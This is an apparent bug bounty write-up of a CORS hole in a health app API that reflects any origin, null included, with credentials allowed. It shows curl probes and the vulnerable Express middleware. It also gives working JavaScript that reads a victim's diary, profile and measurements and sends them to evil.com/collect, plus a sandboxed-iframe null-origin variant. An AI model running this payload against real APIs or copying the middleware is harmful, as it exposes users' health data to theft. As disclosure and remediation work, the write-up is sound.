CORS Reflects Any Origin: Silent Health Data Theft

Inspired by Vitor Falcao's CORS hunting methodology · 200M+ users affected

Vulnerability

The API at api.healthapp.com reflects any origin — including arbitrary external domains and the null origin — with Access-Control-Allow-Credentials: true and Access-Control-Expose-Headers: *. The application uses cookie-based authentication. Any website on the internet can silently make authenticated API requests and read the responses, stealing health data, food diaries, exercise logs, and account information.

The Discovery

A single curl command revealed the misconfiguration:

curl -s -D- -o /dev/null \
  -H "Origin: https://evil.com" \
  "https://api.healthapp.com/"

# Response headers:
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
access-control-expose-headers: *
set-cookie: anon-device-id=...; Domain=healthapp.com; Path=/; Secure

Three critical CORS misconfigurations in one response:

  • Reflects any origin — not just subdomains, but evil.com, attacker.xyz, anything
  • Credentials: true — browser sends cookies with cross-origin requests
  • Expose-Headers: * — all response headers readable cross-origin (including any auth tokens)

Even the null origin is accepted, enabling exploitation via sandboxed iframes:

curl -s -D- -o /dev/null \
  -H "Origin: null" \
  "https://api.healthapp.com/"

# access-control-allow-origin: null
# access-control-allow-credentials: true

Why "Any Origin" is Worse Than You Think

Many developers confuse CORS wildcard (*) with origin reflection. Browsers block Access-Control-Allow-Origin: * with credentials: true. But reflecting the exact requesting origin bypasses this protection:

// This is BLOCKED by browsers:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
// Browser: "Cannot use wildcard with credentials"

// This is ALLOWED by browsers:
Access-Control-Allow-Origin: https://evil.com  // Reflected!
Access-Control-Allow-Credentials: true
// Browser: "Origin matches, credentials allowed, proceed"

// Server-side code that causes this:
app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.header('Access-Control-Allow-Origin', origin); // Reflects ANY origin
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});

Exploitation

The exploit is trivially simple — just a few lines of JavaScript on any website:

<!-- This works from ANY website on the internet -->
<script>
// Steal the victim's food diary
fetch('https://api.healthapp.com/v2/diary?date=2026-04-14', {
  credentials: 'include'
}).then(r => r.json()).then(diary => {

  // Steal their profile
  return fetch('https://api.healthapp.com/v2/me', {
    credentials: 'include'
  }).then(r => r.json()).then(profile => ({diary, profile}));

}).then(({diary, profile}) => {

  // Steal their body measurements
  return fetch('https://api.healthapp.com/v2/measurements', {
    credentials: 'include'
  }).then(r => r.json()).then(measurements =>
    ({diary, profile, measurements}));

}).then(data => {
  // Exfiltrate everything to attacker server
  navigator.sendBeacon('https://evil.com/collect',
    JSON.stringify(data));
});
</script>

The attacker can also use the null origin via a sandboxed iframe for a more stealthy approach:

<!-- Sandboxed iframe sends Origin: null -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
  fetch('https://api.healthapp.com/v2/me', {
    credentials: 'include'
  }).then(r => r.json()).then(data => {
    parent.postMessage(data, '*');
  });
  </script>
"></iframe>

<script>
window.addEventListener('message', e => {
  console.log('Stolen via null origin:', e.data);
});
</script>

Why It Matters

This app has 200M+ users and stores extremely sensitive health data: complete eating history, exercise routines, body measurements, weight goals, medical dietary restrictions, and payment information. The attack is completely silent — no popups, no redirects, no user interaction beyond visiting a page. The victim's browser does all the work. Previously suffered a 150M account breach — this CORS misconfiguration enables the same level of data theft from any website.

Bug Bounty Tip

CORS testing should be one of the first things you do on any target. Three curl commands: (1) -H "Origin: https://evil.com", (2) -H "Origin: https://evil.target.com", (3) -H "Origin: null". Check for access-control-allow-credentials: true in the response. If any of these reflect with credentials, check what API endpoints are accessible — user data, session info, financial data. The more sensitive the data, the higher the bounty. Health/financial data CORS = almost always Critical.

Remediation

  • Implement a strict CORS origin allowlist — only reflect known frontend domains
  • Never reflect the null origin with credentials
  • Remove Access-Control-Expose-Headers: * — only expose necessary headers
  • Move from cookie-based auth to token-based auth (Authorization header) for API calls
  • Add SameSite=Strict to auth cookies as defense-in-depth
  • Remove production credentials from client-side __ENV
